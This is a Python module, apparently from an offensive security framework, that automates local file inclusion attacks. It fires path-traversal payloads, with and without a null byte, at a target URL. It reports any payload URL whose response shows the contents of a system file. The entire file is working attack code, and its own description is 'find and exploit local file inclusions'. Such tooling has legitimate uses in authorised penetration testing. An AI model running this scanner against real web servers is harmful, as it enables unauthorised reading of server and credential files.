import json

import requests

from config import DEFAULT_USER_AGENT
from module import Module, Type

with open("data/payloads/lfi.json") as f:
    PAYLOADS = json.load(f)

NULL_BYTE = "%00"


class LocalFileInclusion(Module):

    def __init__(self):
        super().__init__("local_file_inclusion",
                         ["local", "file", "inclusion", "web"],
                         "find and exploit local file inclusions",
                         ["https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601",
                          "https://book.hacktricks.xyz/pentesting-web/file-inclusion"])

        self.add_option("URL", "url", required=True, type=Type.string)
        self.add_option("DEPTH", "depth", required=True, default=5, type=Type.string)
        self.add_option("COOKIES", "cookies", required=False, type=Type.string)
        self.add_option("USER-AGENT", "user agent", required=True, default=DEFAULT_USER_AGENT, type=Type.string)

    def run(self):
        headers = {"User-Agent": self.user_agent}
        if self.cookies:
            headers["Cookies"] = self.cookies

        for os_name in PAYLOADS.keys():
            for parent, sep in PAYLOADS[os_name]["separators"]:
                for file in PAYLOADS[os_name]["files"]:
                    for d in range(self.depth + 1):
                        path = (parent + sep) * d + sep.join(file["path"])

                        url = self.url + path
                        resp = requests.get(url, headers=headers).text
                        if any(content in resp for content in file["contents"]):
                            print("os:", os_name)
                            print("payload:", url)
                            break

                        url += NULL_BYTE
                        resp = requests.get(url, headers=headers).text
                        if any(content in resp for content in file["contents"]):
                            print("os:", os_name)
                            print("payload:", url)
                            break
